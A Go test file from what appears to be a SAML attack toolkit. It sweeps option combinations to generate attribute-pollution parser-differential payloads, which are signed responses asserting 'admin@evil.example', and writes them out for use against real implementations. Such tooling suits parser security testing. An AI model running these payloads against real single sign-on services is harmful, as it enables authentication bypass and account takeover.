package saml

import (
	"fmt"
	"os"
	"path/filepath"
	"testing"
)

// TestSweepAttrPollution dumps every attribute-pollution shape so they can be
// run against a real implementation. Payload design is measurement, not
// guesswork: only the target can say which shape actually splits its parsers.
func TestSweepAttrPollution(t *testing.T) {
	dir := os.Getenv("PLASMID_DUMP_DIR")
	if dir == "" {
		t.Skip("set PLASMID_DUMP_DIR to dump sweep payloads")
	}
	key, cert := realIDPMaterial(t)
	p := NewParserDiffer(key, cert)

	for _, prefixed := range []bool{true, false} {
		for _, xmlID := range []bool{true, false} {
			for _, first := range []bool{true, false} {
				if !prefixed && !xmlID {
					continue
				}
				opt := defaultParserDiffOptions
				opt.EmitPrefixedID = prefixed
				opt.EmitXMLID = xmlID
				opt.PrefixedIDFirst = first
				name := fmt.Sprintf("sweep-attr_p%t-x%t-first%t.xml", prefixed, xmlID, first)
				out, _, err := p.applyWith(fullResponse(t, key, cert, "admin@evil.example", true), ParserDiffAttrPollution, opt)
				if err != nil {
					t.Logf("%s: %v", name, err)
					continue
				}
				if err := os.WriteFile(filepath.Join(dir, name), out, 0o644); err != nil {
					t.Fatalf("write: %v", err)
				}
				t.Logf("wrote %s", name)
			}
		}
	}
}
